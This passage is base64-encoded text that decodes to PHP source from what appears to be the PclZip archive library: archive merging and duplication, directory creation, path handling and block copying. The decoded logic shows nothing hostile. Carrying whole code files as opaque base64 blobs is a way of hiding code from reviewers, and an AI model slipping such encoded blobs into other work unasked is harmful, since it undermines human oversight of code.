dkNoZWNrRmlsZUhlYWRlcnMoJHZfbG9jYWxfaGVhZGVyLA0KCQkgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICR2X2hlYWRlcl9saXN0WyRpXSkgIT0gMSkgew0KICAgICAgICAgIH0NCiAgICAgICAgICB1bnNldCgkdl9sb2NhbF9oZWFkZXIpOw0KDQogICAgICAgICAgaWYgKCgkdl9yZXN1bHQgPSAkdl90ZW1wX3ppcC0+cHJpdldyaXRlRmlsZUhlYWRlcigkdl9oZWFkZXJfbGlzdFskaV0pKSAhPSAxKSB7DQogICAgICAgICAgICAgICR0aGlzLT5wcml2Q2xvc2VGZCgpOw0KICAgICAgICAgICAgICAkdl90ZW1wX3ppcC0+cHJpdkNsb3NlRmQoKTsNCiAgICAgICAgICAgICAgQHVubGluaygkdl96aXBfdGVtcF9uYW1lKTsNCg0KICAgICAgICAgICAgICByZXR1cm4gJHZfcmVzdWx0Ow0KICAgICAgICAgIH0NCg0KICAgICAgICAgIGlmICgoJHZfcmVzdWx0ID0gUGNsWmlwVXRpbENvcHlCbG9jaygkdGhpcy0+emlwX2ZkLCAkdl90ZW1wX3ppcC0+emlwX2ZkLCAkdl9oZWFkZXJfbGlzdFskaV1bJ2NvbXByZXNzZWRfc2l6ZSddKSkgIT0gMSkgew0KICAgICAgICAgICAgICAkdGhpcy0+cHJpdkNsb3NlRmQoKTsNCiAgICAgICAgICAgICAgJHZfdGVtcF96aXAtPnByaXZDbG9zZUZkKCk7DQogICAgICAgICAgICAgIEB1bmxpbmsoJHZfemlwX3RlbXBfbmFtZSk7DQoNCiAgICAgICAgICAgICAgcmV0dXJuICR2X3Jlc3VsdDsNCiAgICAgICAgICB9DQogICAgICB9DQoNCiAgICAgICR2X29mZnNldCA9IEBmdGVsbCgkdl90ZW1wX3ppcC0+emlwX2ZkKTsNCg0KICAgICAgZm9yICgkaT0wOyAkaTxzaXplb2YoJHZfaGVhZGVyX2xpc3QpOyAkaSsrKSB7DQogICAgICAgICAgaWYgKCgkdl9yZXN1bHQgPSAkdl90ZW1wX3ppcC0+cHJpdldyaXRlQ2VudHJhbEZpbGVIZWFkZXIoJHZfaGVhZGVyX2xpc3RbJGldKSkgIT0gMSkgew0KICAgICAgICAgICAgICAkdl90ZW1wX3ppcC0+cHJpdkNsb3NlRmQoKTsNCiAgICAgICAgICAgICAgJHRoaXMtPnByaXZDbG9zZUZkKCk7DQogICAgICAgICAgICAgIEB1bmxpbmsoJHZfemlwX3RlbXBfbmFtZSk7DQoNCiAgICAgICAgICAgICAgcmV0dXJuICR2X3Jlc3VsdDsNCiAgICAgICAgICB9DQoNCiAgICAgICAgICAkdl90ZW1wX3ppcC0+cHJpdkNvbnZlcnRIZWFkZXIyRmlsZUluZm8oJHZfaGVhZGVyX2xpc3RbJGldLCAkcF9yZXN1bHRfbGlzdFskaV0pOw0KICAgICAgfQ0KDQoNCiAgICAgICR2X2NvbW1lbnQgPSAnJzsNCiAgICAgIGlmIChpc3NldCgkcF9vcHRpb25zW1BDTFpJUF9PUFRfQ09NTUVOVF0pKSB7DQogICAgICAgICR2X2NvbW1lbnQgPSAkcF9vcHRpb25zW1BDTFpJUF9PUFRfQ09NTUVOVF07DQogICAgICB9DQoNCiAgICAgICR2X3NpemUgPSBAZnRlbGwoJHZfdGVtcF96aXAtPnppcF9mZCktJHZfb2Zmc2V0Ow0KDQogICAgICBpZiAoKCR2X3Jlc3VsdCA9ICR2X3RlbXBfemlwLT5wcml2V3JpdGVDZW50cmFsSGVhZGVyKHNpemVvZigkdl9oZWFkZXJfbGlzdCksICR2X3NpemUsICR2X29mZnNldCwgJHZfY29tbWVudCkpICE9IDEpIHsNCiAgICAgICAgICB1bnNldCgkdl9oZWFkZXJfbGlzdCk7DQogICAgICAgICAgJHZfdGVtcF96aXAtPnByaXZDbG9zZUZkKCk7DQogICAgICAgICAgJHRoaXMtPnByaXZDbG9zZUZkKCk7DQogICAgICAgICAgQHVubGluaygkdl96aXBfdGVtcF9uYW1lKTsNCg0KICAgICAgICAgIHJldHVybiAkdl9yZXN1bHQ7DQogICAgICB9DQoNCiAgICAgICR2X3RlbXBfemlwLT5wcml2Q2xvc2VGZCgpOw0KICAgICAgJHRoaXMtPnByaXZDbG9zZUZkKCk7DQoNCiAgICAgIEB1bmxpbmsoJHRoaXMtPnppcG5hbWUpOw0KDQogICAgICBQY2xaaXBVdGlsUmVuYW1lKCR2X3ppcF90ZW1wX25hbWUsICR0aGlzLT56aXBuYW1lKTsNCiAgDQogICAgICB1bnNldCgkdl90ZW1wX3ppcCk7DQogIH0NCiAgDQogIGVsc2UgaWYgKCR2X2NlbnRyYWxfZGlyWydlbnRyaWVzJ10gIT0gMCkgew0KICAgICAgJHRoaXMtPnByaXZDbG9zZUZkKCk7DQoNCiAgICAgIGlmICgoJHZfcmVzdWx0ID0gJHRoaXMtPnByaXZPcGVuRmQoJ3diJykpICE9IDEpIHsNCiAgICAgICAgcmV0dXJuICR2X3Jlc3VsdDsNCiAgICAgIH0NCg0KICAgICAgaWYgKCgkdl9yZXN1bHQgPSAkdGhpcy0+cHJpdldyaXRlQ2VudHJhbEhlYWRlcigwLCAwLCAwLCAnJykpICE9IDEpIHsNCiAgICAgICAgcmV0dXJuICR2X3Jlc3VsdDsNCiAgICAgIH0NCg0KICAgICAgJHRoaXMtPnByaXZDbG9zZUZkKCk7DQogIH0NCg0KICByZXR1cm4gJHZfcmVzdWx0Ow0KfQ0KDQpmdW5jdGlvbiBwcml2RGlyQ2hlY2soJHBfZGlyLCAkcF9pc19kaXI9ZmFsc2UpDQp7DQogICR2X3Jlc3VsdCA9IDE7DQoNCg0KICBpZiAoKCRwX2lzX2RpcikgJiYgKHN1YnN0cigkcF9kaXIsIC0xKT09Jy8nKSkNCiAgew0KICAgICRwX2RpciA9IHN1YnN0cigkcF9kaXIsIDAsIHN0cmxlbigkcF9kaXIpLTEpOw0KICB9DQoNCiAgaWYgKChpc19kaXIoJHBfZGlyKSkgfHwgKCRwX2RpciA9PSAiIikpDQogIHsNCiAgICByZXR1cm4gMTsNCiAgfQ0KDQogICRwX3BhcmVudF9kaXIgPSBkaXJuYW1lKCRwX2Rpcik7DQoNCiAgaWYgKCRwX3BhcmVudF9kaXIgIT0gJHBfZGlyKQ0KICB7DQogICAgaWYgKCRwX3BhcmVudF9kaXIgIT0gIiIpDQogICAgew0KICAgICAgaWYgKCgkdl9yZXN1bHQgPSAkdGhpcy0+cHJpdkRpckNoZWNrKCRwX3BhcmVudF9kaXIpKSAhPSAxKQ0KICAgICAgew0KICAgICAgICByZXR1cm4gJHZfcmVzdWx0Ow0KICAgICAgfQ0KICAgIH0NCiAgfQ0KDQogIGlmICghQG1rZGlyKCRwX2RpciwgMDc3NykpDQogIHsNCiAgICBQY2xaaXA6OnByaXZFcnJvckxvZyhQQ0xaSVBfRVJSX0RJUl9DUkVBVEVfRkFJTCwgIlVuYWJsZSB0byBjcmVhdGUgZGlyZWN0b3J5ICckcF9kaXInIik7DQoNCiAgICByZXR1cm4gUGNsWmlwOjplcnJvckNvZGUoKTsNCiAgfQ0KDQogIHJldHVybiAkdl9yZXN1bHQ7DQp9DQoNCmZ1bmN0aW9uIHByaXZNZXJnZSgmJHBfYXJjaGl2ZV90b19hZGQpDQp7DQogICR2X3Jlc3VsdD0xOw0KDQogIGlmICghaXNfZmlsZSgkcF9hcmNoaXZlX3RvX2FkZC0+emlwbmFtZSkpDQogIHsNCg0KICAgICR2X3Jlc3VsdCA9IDE7DQoNCiAgICByZXR1cm4gJHZfcmVzdWx0Ow0KICB9DQoNCiAgaWYgKCFpc19maWxlKCR0aGlzLT56aXBuYW1lKSkNCiAgew0KDQogICAgJHZfcmVzdWx0ID0gJHRoaXMtPnByaXZEdXBsaWNhdGUoJHBfYXJjaGl2ZV90b19hZGQtPnppcG5hbWUpOw0KDQogICAgcmV0dXJuICR2X3Jlc3VsdDsNCiAgfQ0KDQogIGlmICgoJHZfcmVzdWx0PSR0aGlzLT5wcml2T3BlbkZkKCdyYicpKSAhPSAxKQ0KICB7DQogICAgcmV0dXJuICR2X3Jlc3VsdDsNCiAgfQ0KDQogICR2X2NlbnRyYWxfZGlyID0gYXJyYXkoKTsNCiAgaWYgKCgkdl9yZXN1bHQgPSAkdGhpcy0+cHJpdlJlYWRFbmRDZW50cmFsRGlyKCR2X2NlbnRyYWxfZGlyKSkgIT0gMSkNCiAgew0KICAgICR0aGlzLT5wcml2Q2xvc2VGZCgpOw0KICAgIHJldHVybiAkdl9yZXN1bHQ7DQogIH0NCg0KICBAcmV3aW5kKCR0aGlzLT56aXBfZmQpOw0KDQogIGlmICgoJHZfcmVzdWx0PSRwX2FyY2hpdmVfdG9fYWRkLT5wcml2T3BlbkZkKCdyYicpKSAhPSAxKQ0KICB7DQogICAgJHRoaXMtPnByaXZDbG9zZUZkKCk7DQoNCiAgICByZXR1cm4gJHZfcmVzdWx0Ow0KICB9DQoNCiAgJHZfY2VudHJhbF9kaXJfdG9fYWRkID0gYXJyYXkoKTsNCiAgaWYgKCgkdl9yZXN1bHQgPSAkcF9hcmNoaXZlX3RvX2FkZC0+cHJpdlJlYWRFbmRDZW50cmFsRGlyKCR2X2NlbnRyYWxfZGlyX3RvX2FkZCkpICE9IDEpDQogIHsNCiAgICAkdGhpcy0+cHJpdkNsb3NlRmQoKTsNCiAgICAkcF9hcmNoaXZlX3RvX2FkZC0+cHJpdkNsb3NlRmQoKTsNCg0KICAgIHJldHVybiAkdl9yZXN1bHQ7DQogIH0NCg0KICBAcmV3aW5kKCRwX2FyY2hpdmVfdG9fYWRkLT56aXBfZmQpOw0KDQogICR2X3ppcF90ZW1wX25hbWUgPSBQQ0xaSVBfVEVNUE9SQVJZX0RJUi51bmlxaWQoJ3BjbHppcC0nKS4nLnRtcCc7DQoNCiAgaWYgKCgkdl96aXBfdGVtcF9mZCA9IEBmb3Blbigkdl96aXBfdGVtcF9uYW1lLCAnd2InKSkgPT0gMCkNCiAgew0KICAgICR0aGlzLT5wcml2Q2xvc2VGZCgpOw0KICAgICRwX2FyY2hpdmVfdG9fYWRkLT5wcml2Q2xvc2VGZCgpOw0KDQogICAgUGNsWmlwOjpwcml2RXJyb3JMb2coUENMWklQX0VSUl9SRUFEX09QRU5fRkFJTCwgJ1VuYWJsZSB0byBvcGVuIHRlbXBvcmFyeSBmaWxlIFwnJy4kdl96aXBfdGVtcF9uYW1lLidcJyBpbiBiaW5hcnkgd3JpdGUgbW9kZScpOw0KDQogICAgcmV0dXJuIFBjbFppcDo6ZXJyb3JDb2RlKCk7DQogIH0NCg0KICAkdl9zaXplID0gJHZfY2VudHJhbF9kaXJbJ29mZnNldCddOw0KICB3aGlsZSAoJHZfc2l6ZSAhPSAwKQ0KICB7DQogICAgJHZfcmVhZF9zaXplID0gKCR2X3NpemUgPCBQQ0xaSVBfUkVBRF9CTE9DS19TSVpFID8gJHZfc2l6ZSA6IFBDTFpJUF9SRUFEX0JMT0NLX1NJWkUpOw0KICAgICR2X2J1ZmZlciA9IGZyZWFkKCR0aGlzLT56aXBfZmQsICR2X3JlYWRfc2l6ZSk7DQogICAgQGZ3cml0ZSgkdl96aXBfdGVtcF9mZCwgJHZfYnVmZmVyLCAkdl9yZWFkX3NpemUpOw0KICAgICR2X3NpemUgLT0gJHZfcmVhZF9zaXplOw0KICB9DQoNCiAgJHZfc2l6ZSA9ICR2X2NlbnRyYWxfZGlyX3RvX2FkZFsnb2Zmc2V0J107DQogIHdoaWxlICgkdl9zaXplICE9IDApDQogIHsNCiAgICAkdl9yZWFkX3NpemUgPSAoJHZfc2l6ZSA8IFBDTFpJUF9SRUFEX0JMT0NLX1NJWkUgPyAkdl9zaXplIDogUENMWklQX1JFQURfQkxPQ0tfU0laRSk7DQogICAgJHZfYnVmZmVyID0gZnJlYWQoJHBfYXJjaGl2ZV90b19hZGQtPnppcF9mZCwgJHZfcmVhZF9zaXplKTsNCiAgICBAZndyaXRlKCR2X3ppcF90ZW1wX2ZkLCAkdl9idWZmZXIsICR2X3JlYWRfc2l6ZSk7DQogICAgJHZfc2l6ZSAtPSAkdl9yZWFkX3NpemU7DQogIH0NCg0KICAkdl9vZmZzZXQgPSBAZnRlbGwoJHZfemlwX3RlbXBfZmQpOw0KDQogICR2X3NpemUgPSAkdl9jZW50cmFsX2Rpclsnc2l6ZSddOw0KICB3aGlsZSAoJHZfc2l6ZSAhPSAwKQ0KICB7DQogICAgJHZfcmVhZF9zaXplID0gKCR2X3NpemUgPCBQQ0xaSVBfUkVBRF9CTE9DS19TSVpFID8gJHZfc2l6ZSA6IFBDTFpJUF9SRUFEX0JMT0NLX1NJWkUpOw0KICAgICR2X2J1ZmZlciA9IEBmcmVhZCgkdGhpcy0+emlwX2ZkLCAkdl9yZWFkX3NpemUpOw0KICAgIEBmd3JpdGUoJHZfemlwX3RlbXBfZmQsICR2X2J1ZmZlciwgJHZfcmVhZF9zaXplKTsNCiAgICAkdl9zaXplIC09ICR2X3JlYWRfc2l6ZTsNCiAgfQ0KDQogICR2X3NpemUgPSAkdl9jZW50cmFsX2Rpcl90b19hZGRbJ3NpemUnXTsNCiAgd2hpbGUgKCR2X3NpemUgIT0gMCkNCiAgew0KICAgICR2X3JlYWRfc2l6ZSA9ICgkdl9zaXplIDwgUENMWklQX1JFQURfQkxPQ0tfU0laRSA/ICR2X3NpemUgOiBQQ0xaSVBfUkVBRF9CTE9DS19TSVpFKTsNCiAgICAkdl9idWZmZXIgPSBAZnJlYWQoJHBfYXJjaGl2ZV90b19hZGQtPnppcF9mZCwgJHZfcmVhZF9zaXplKTsNCiAgICBAZndyaXRlKCR2X3ppcF90ZW1wX2ZkLCAkdl9idWZmZXIsICR2X3JlYWRfc2l6ZSk7DQogICAgJHZfc2l6ZSAtPSAkdl9yZWFkX3NpemU7DQogIH0NCg0KICAkdl9jb21tZW50ID0gJHZfY2VudHJhbF9kaXJbJ2NvbW1lbnQnXS4nICcuJHZfY2VudHJhbF9kaXJfdG9fYWRkWydjb21tZW50J107DQoNCiAgJHZfc2l6ZSA9IEBmdGVsbCgkdl96aXBfdGVtcF9mZCktJHZfb2Zmc2V0Ow0KDQogICR2X3N3YXAgPSAkdGhpcy0+emlwX2ZkOw0KICAkdGhpcy0+emlwX2ZkID0gJHZfemlwX3RlbXBfZmQ7DQogICR2X3ppcF90ZW1wX2ZkID0gJHZfc3dhcDsNCg0KICBpZiAoKCR2X3Jlc3VsdCA9ICR0aGlzLT5wcml2V3JpdGVDZW50cmFsSGVhZGVyKCR2X2NlbnRyYWxfZGlyWydlbnRyaWVzJ10rJHZfY2VudHJhbF9kaXJfdG9fYWRkWydlbnRyaWVzJ10sICR2X3NpemUsICR2X29mZnNldCwgJHZfY29tbWVudCkpICE9IDEpDQogIHsNCiAgICAkdGhpcy0+cHJpdkNsb3NlRmQoKTsNCiAgICAkcF9hcmNoaXZlX3RvX2FkZC0+cHJpdkNsb3NlRmQoKTsNCiAgICBAZmNsb3NlKCR2X3ppcF90ZW1wX2ZkKTsNCiAgICAkdGhpcy0+emlwX2ZkID0gbnVsbDsNCg0KICAgIHVuc2V0KCR2X2hlYWRlcl9saXN0KTsNCg0KICAgIHJldHVybiAkdl9yZXN1bHQ7DQogIH0NCg0KICAkdl9zd2FwID0gJHRoaXMtPnppcF9mZDsNCiAgJHRoaXMtPnppcF9mZCA9ICR2X3ppcF90ZW1wX2ZkOw0KICAkdl96aXBfdGVtcF9mZCA9ICR2X3N3YXA7DQoNCiAgJHRoaXMtPnByaXZDbG9zZUZkKCk7DQogICRwX2FyY2hpdmVfdG9fYWRkLT5wcml2Q2xvc2VGZCgpOw0KDQogIEBmY2xvc2UoJHZfemlwX3RlbXBfZmQpOw0KDQogIEB1bmxpbmsoJHRoaXMtPnppcG5hbWUpOw0KDQogIFBjbFppcFV0aWxSZW5hbWUoJHZfemlwX3RlbXBfbmFtZSwgJHRoaXMtPnppcG5hbWUpOw0KDQogIHJldHVybiAkdl9yZXN1bHQ7DQp9DQoNCmZ1bmN0aW9uIHByaXZEdXBsaWNhdGUoJHBfYXJjaGl2ZV9maWxlbmFtZSkNCnsNCiAgJHZfcmVzdWx0PTE7DQoNCiAgaWYgKCFpc19maWxlKCRwX2FyY2hpdmVfZmlsZW5hbWUpKQ0KICB7DQoNCiAgICAkdl9yZXN1bHQgPSAxOw0KDQogICAgcmV0dXJuICR2X3Jlc3VsdDsNCiAgfQ0KDQogIGlmICgoJHZfcmVzdWx0PSR0aGlzLT5wcml2T3BlbkZkKCd3YicpKSAhPSAxKQ0KICB7DQogICAgcmV0dXJuICR2X3Jlc3VsdDsNCiAgfQ0KDQogIGlmICgoJHZfemlwX3RlbXBfZmQgPSBAZm9wZW4oJHBfYXJjaGl2ZV9maWxlbmFtZSwgJ3JiJykpID09IDApDQogIHsNCiAgICAkdGhpcy0+cHJpdkNsb3NlRmQoKTsNCg0KICAgIFBjbFppcDo6cHJpdkVycm9yTG9nKFBDTFpJUF9FUlJfUkVBRF9PUEVOX0ZBSUwsICdVbmFibGUgdG8gb3BlbiBhcmNoaXZlIGZpbGUgXCcnLiRwX2FyY2hpdmVfZmlsZW5hbWUuJ1wnIGluIGJpbmFyeSB3cml0ZSBtb2RlJyk7DQoNCiAgICByZXR1cm4gUGNsWmlwOjplcnJvckNvZGUoKTsNCiAgfQ0KDQogICR2X3NpemUgPSBmaWxlc2l6ZSgkcF9hcmNoaXZlX2ZpbGVuYW1lKTsNCiAgd2hpbGUgKCR2X3NpemUgIT0gMCkNCiAgew0KICAgICR2X3JlYWRfc2l6ZSA9ICgkdl9zaXplIDwgUENMWklQX1JFQURfQkxPQ0tfU0laRSA/ICR2X3NpemUgOiBQQ0xaSVBfUkVBRF9CTE9DS19TSVpFKTsNCiAgICAkdl9idWZmZXIgPSBmcmVhZCgkdl96aXBfdGVtcF9mZCwgJHZfcmVhZF9zaXplKTsNCiAgICBAZndyaXRlKCR0aGlzLT56aXBfZmQsICR2X2J1ZmZlciwgJHZfcmVhZF9zaXplKTsNCiAgICAkdl9zaXplIC09ICR2X3JlYWRfc2l6ZTsNCiAgfQ0KDQogICR0aGlzLT5wcml2Q2xvc2VGZCgpOw0KDQogIEBmY2xvc2UoJHZfemlwX3RlbXBfZmQpOw0KDQogIHJldHVybiAkdl9yZXN1bHQ7DQp9DQoNCmZ1bmN0aW9uIHByaXZFcnJvckxvZygkcF9lcnJvcl9jb2RlPTAsICRwX2Vycm9yX3N0cmluZz0nJykNCnsNCiAgaWYgKFBDTFpJUF9FUlJPUl9FWFRFUk5BTCA9PSAxKSB7DQogICAgUGNsRXJyb3IoJHBfZXJyb3JfY29kZSwgJHBfZXJyb3Jfc3RyaW5nKTsNCiAgfQ0KICBlbHNlIHsNCiAgICAkdGhpcy0+ZXJyb3JfY29kZSA9ICRwX2Vycm9yX2NvZGU7DQogICAgJHRoaXMtPmVycm9yX3N0cmluZyA9ICRwX2Vycm9yX3N0cmluZzsNCiAgfQ0KfQ0KDQpmdW5jdGlvbiBwcml2RXJyb3JSZXNldCgpDQp7DQogIGlmIChQQ0xaSVBfRVJST1JfRVhURVJOQUwgPT0gMSkgew0KICAgIFBjbEVycm9yUmVzZXQoKTsNCiAgfQ0KICBlbHNlIHsNCiAgICAkdGhpcy0+ZXJyb3JfY29kZSA9IDA7DQogICAgJHRoaXMtPmVycm9yX3N0cmluZyA9ICcnOw0KICB9DQp9DQoNCmZ1bmN0aW9uIHByaXZEaXNhYmxlTWFnaWNRdW90ZXMoKQ0Kew0KICAkdl9yZXN1bHQ9MTsNCg0KICBpZiAoICAgKCFmdW5jdGlvbl9leGlzdHMoImdldF9tYWdpY19xdW90ZXNfcnVudGltZSIpKQ0KICAgIHx8ICghZnVuY3Rpb25fZXhpc3RzKCJzZXRfbWFnaWNfcXVvdGVzX3J1bnRpbWUiKSkpIHsNCiAgICByZXR1cm4gJHZfcmVzdWx0Ow0KfQ0KDQogIGlmICgkdGhpcy0+bWFnaWNfcXVvdGVzX3N0YXR1cyAhPSAtMSkgew0KICAgIHJldHVybiAkdl9yZXN1bHQ7DQp9DQoNCiR0aGlzLT5tYWdpY19xdW90ZXNfc3RhdHVzID0gQGdldF9tYWdpY19xdW90ZXNfcnVudGltZSgpOw0KDQppZiAoJHRoaXMtPm1hZ2ljX3F1b3Rlc19zdGF0dXMgPT0gMSkgew0KICBAc2V0X21hZ2ljX3F1b3Rlc19ydW50aW1lKDApOw0KfQ0KDQogIHJldHVybiAkdl9yZXN1bHQ7DQp9DQoNCmZ1bmN0aW9uIHByaXZTd2FwQmFja01hZ2ljUXVvdGVzKCkNCnsNCiAgJHZfcmVzdWx0PTE7DQoNCiAgaWYgKCAgICghZnVuY3Rpb25fZXhpc3RzKCJnZXRfbWFnaWNfcXVvdGVzX3J1bnRpbWUiKSkNCiAgICB8fCAoIWZ1bmN0aW9uX2V4aXN0cygic2V0X21hZ2ljX3F1b3Rlc19ydW50aW1lIikpKSB7DQogICAgcmV0dXJuICR2X3Jlc3VsdDsNCn0NCg0KICBpZiAoJHRoaXMtPm1hZ2ljX3F1b3Rlc19zdGF0dXMgIT0gLTEpIHsNCiAgICByZXR1cm4gJHZfcmVzdWx0Ow0KfQ0KDQppZiAoJHRoaXMtPm1hZ2ljX3F1b3Rlc19zdGF0dXMgPT0gMSkgew0KCSAgQHNldF9tYWdpY19xdW90ZXNfcnVudGltZSgkdGhpcy0+bWFnaWNfcXVvdGVzX3N0YXR1cyk7DQp9DQoNCiAgcmV0dXJuICR2X3Jlc3VsdDsNCn0NCg0KfQ0KDQpmdW5jdGlvbiBQY2xaaXBVdGlsUGF0aFJlZHVjdGlvbigkcF9kaXIpDQp7DQogICR2X3Jlc3VsdCA9ICIiOw0KDQogIGlmICgkcF9kaXIgIT0gIiIpIHsNCiAgICAkdl9saXN0ID0gZXhwbG9kZSgiLyIsICRwX2Rpcik7DQoNCiAgICAkdl9za2lwID0gMDsNCiAgICBmb3IgKCRpPXNpemVvZigkdl9saXN0KS0xOyAkaT49MDsgJGktLSkgew0KICAgICAgaWYgKCR2X2xpc3RbJGldID09ICIuIikgew0KICAgICAgfQ0KICAgICAgZWxzZSBpZiAoJHZfbGlzdFskaV0gPT0gIi4uIikgew0KCSAgJHZfc2tpcCsrOw0KICAgICAgfQ0KICAgICAgZWxzZSBpZiAoJHZfbGlzdFskaV0gPT0gIiIpIHsNCgkgIGlmICgkaSA9PSAwKSB7DQogICAgICAgICAgJHZfcmVzdWx0ID0gIi8iLiR2X3Jlc3VsdDsNCgkgICAgaWYgKCR2X3NraXAgPiAwKSB7DQoJICAgICAgICAkdl9yZXN1bHQgPSAkcF9kaXI7DQogICAgICAgICAgICAgICR2X3NraXAgPSAwOw0KCSAgICB9DQoJICB9DQoJICBlbHNlIGlmICgkaSA9PSAoc2l6ZW9mKCR2X2xpc3QpLTEpKSB7DQogICAgICAgICAgJHZfcmVzdWx0ID0gJHZfbGlzdFskaV07DQoJICB9DQoJICBlbHNlIHsNCgkgIH0NCiAgICAgIH0NCiAgICAgIGVsc2Ugew0KCSAgaWYgKCR2X3NraXAgPiAwKSB7DQoJICAgICR2X3NraXAtLTsNCgkgIH0NCgkgIGVsc2Ugew0KICAgICAgICAgICR2X3Jlc3VsdCA9ICR2X2xpc3RbJGldLigkaSE9KHNpemVvZigkdl9saXN0KS0xKT8iLyIuJHZfcmVzdWx0OiIiKTsNCgkgIH0NCiAgICAgIH0NCiAgICB9DQogICAgDQogICAgaWYgKCR2X3NraXAgPiAwKSB7DQogICAgICB3aGlsZSAoJHZfc2tpcCA+IDApIHsNCiAgICAgICAgICAkdl9yZXN1bHQgPSAnLi4vJy4kdl9yZXN1bHQ7DQogICAgICAgICAgJHZfc2tpcC0tOw0KICAgICAgfQ0KICAgIH0NCiAgfQ0KDQogIHJldHVybiAkdl9yZXN1bHQ7DQp9DQoNCmZ1bmN0aW9uIFBjbFppcFV0aWxQYXRoSW5jbHVzaW9uKCRwX2RpciwgJHBfcGF0aCkNCnsNCiAgJHZfcmVzdWx0ID0gMTsNCiAgDQogIGlmICggICAoJHBfZGlyID09ICcuJykNCiAgICAgIHx8ICgoc3RybGVuKCRwX2RpcikgPj0yKSAmJiAoc3Vic3RyKCRwX2RpciwgMCwgMikgPT0gJy4vJykpKSB7DQogICAgJHBfZGlyID0gUGNsWmlwVXRpbFRyYW5zbGF0ZVdpblBhdGgoZ2V0Y3dkKCksIEZBTFNFKS4nLycuc3Vic3RyKCRwX2RpciwgMSk7DQogIH0NCiAgaWYgKCAgICgkcF9wYXRoID09ICcuJykNCiAgICAgIHx8ICgoc3RybGVuKCRwX3BhdGgpID49MikgJiYgKHN1YnN0cigkcF9wYXRoLCAwLCAyKSA9PSAnLi8nKSkpIHsNCiAgICAkcF9wYXRoID0gUGNsWmlwVXRpbFRyYW5zbGF0ZVdpblBhdGgoZ2V0Y3dkKCksIEZBTFNFKS4nLycuc3Vic3RyKCRwX3BhdGgsIDEpOw0KICB9DQoNCiAgJHZfbGlzdF9kaXIgPSBleHBsb2RlKCIvIiwgJHBfZGlyKTsNCiAgJHZfbGlzdF9kaXJfc2l6ZSA9IHNpemVvZigkdl9saXN0X2Rpcik7DQogICR2X2xpc3RfcGF0aCA9IGV4cGxvZGUoIi8iLCAkcF9wYXRoKTsNCiAgJHZfbGlzdF9wYXRoX3NpemUgPSBzaXplb2YoJHZfbGlzdF9wYXRoKTsNCg0KICAkaSA9IDA7DQogICRqID0gMDsNCiAgd2hpbGUgKCgkaSA8ICR2X2xpc3RfZGlyX3NpemUpICYmICgkaiA8ICR2X2xpc3RfcGF0aF9zaXplKSAmJiAoJHZfcmVzdWx0KSkgew0KDQogICAgaWYgKCR2X2xpc3RfZGlyWyRpXSA9PSAnJykgew0KICAgICAgJGkrKzsNCiAgICAgIGNvbnRpbnVlOw0KICAgIH0NCiAgICBpZiAoJHZfbGlzdF9wYXRoWyRqXSA9PSAnJykgew0KICAgICAgJGorKzsNCiAgICAgIGNvbnRpbnVlOw0KICAgIH0NCg0KICAgIGlmICgoJHZfbGlzdF9kaXJbJGldICE9ICR2X2xpc3RfcGF0aFskal0pICYmICgkdl9saXN0X2RpclskaV0gIT0gJycpICYmICggJHZfbGlzdF9wYXRoWyRqXSAhPSAnJykpICB7DQogICAgICAkdl9yZXN1bHQgPSAwOw0KICAgIH0NCg0KICAgICRpKys7DQogICAgJGorKzsNCiAgfQ0KDQogIGlmICgkdl9yZXN1bHQpIHsNCiAgICB3aGlsZSAoKCRqIDwgJHZfbGlzdF9wYXRoX3NpemUpICYmICgkdl9saXN0X3BhdGhbJGpdID09ICcnKSkgJGorKzsNCiAgICB3aGlsZSAoKCRpIDwgJHZfbGlzdF9kaXJfc2l6ZSkgJiYgKCR2X2xpc3RfZGlyWyRpXSA9PSAnJykpICRpKys7DQoNCiAgICBpZiAoKCRpID49ICR2X2xpc3RfZGlyX3NpemUpICYmICgkaiA+PSAkdl9saXN0X3BhdGhfc2l6ZSkpIHsNCiAgICAgICR2X3Jlc3VsdCA9IDI7DQogICAgfQ0KICAgIGVsc2UgaWYgKCRpIDwgJHZfbGlzdF9kaXJfc2l6ZSkgew0KICAgICAgJHZfcmVzdWx0ID0gMDsNCiAgICB9DQogIH0NCg0KICByZXR1cm4gJHZfcmVzdWx0Ow0KfQ0KDQpmdW5jdGlvbiBQY2xaaXBVdGlsQ29weUJsb2NrKCRwX3NyYywgJHBfZGVzdCwgJHBfc2l6ZSwgJHBfbW9kZT0wKQ0Kew0KICAkdl9yZXN1bHQgPSAxOw0KDQogIGlmICgkcF9tb2RlPT0wKQ0KICB7DQogICAgd2hpbGUgKCRwX3NpemUgIT0gMCkNCiAgICB7DQogICAgICAkdl9yZWFkX3NpemUgPSAoJHBfc2l6ZSA8IFBDTFpJUF9SRUFEX0JMT0NLX1NJWkUgPyAkcF9zaXplIDogUENMWklQX1JFQURfQkxPQ0tfU0laRSk7DQogICAgICAkdl9idWZmZXIgPSBAZnJlYWQoJHBfc3JjLCAkdl9yZWFkX3NpemUpOw0KICAgICAgQGZ3cml0ZSgkcF9kZXN0LCAkdl9idWZmZXIsICR2X3JlYWRfc2l6ZSk7DQogICAgICAkcF9zaXplIC09ICR2X3JlYWRfc2l6ZTsNCiAgICB9DQogIH0NCiAgZWxzZSBpZiAoJHBfbW9kZT09MSkNCiAgew0KICAgIHdoaWxlICgkcF9zaXplICE9IDApDQogICAgew0KICAgICAgJHZfcmVhZF9zaXplID0gKCRwX3NpemUgPCBQQ0xaSVBfUkVBRF9CTE9DS19TSVpFID8gJHBfc2l6ZSA6IFBDTFpJUF9SRUFEX0JMT0NLX1NJWkUpOw0KICAgICAgJHZfYnVmZmVyID0gQGd6cmVhZCgkcF9zcmMsICR2X3JlYWRfc2l6ZSk7DQogICAgICBAZndyaXRlKCRwX2Rlc3QsICR2X2J1ZmZlciwgJHZfcmVhZF9zaXplKTsNCiAgICAgICRwX3NpemUgLT0gJHZfcmVhZF9zaXplOw0KICAgIH0NCiAgfQ0KICBlbHNlIGlmICgkcF9tb2RlPT0yKQ0KICB7DQogICAgd2hpbGUgKCRwX3NpemUgIT0gMCkNCiAgICB7DQogICAgICAkdl9yZWFkX3NpemUgPSAoJHBfc2l6ZSA8IFBDTFpJUF9SRUFEX0JMT0NLX1NJWkUgPyAkcF9zaXplIDogUENMWklQX1JFQURfQkxPQ0tfU0laRSk7DQogICAgICAkdl9idWZmZXIgPSBAZnJlYWQoJHBfc3JjLCAkdl9yZWFkX3NpemUpOw0KICAgICAgQGd6d3JpdGUoJHBfZGVzdCwgJHZfYnVmZmVyLCAkdl9yZWFkX3NpemUpOw0KICAgICAgJHBfc2l6ZSAtPSAkdl9yZWFkX3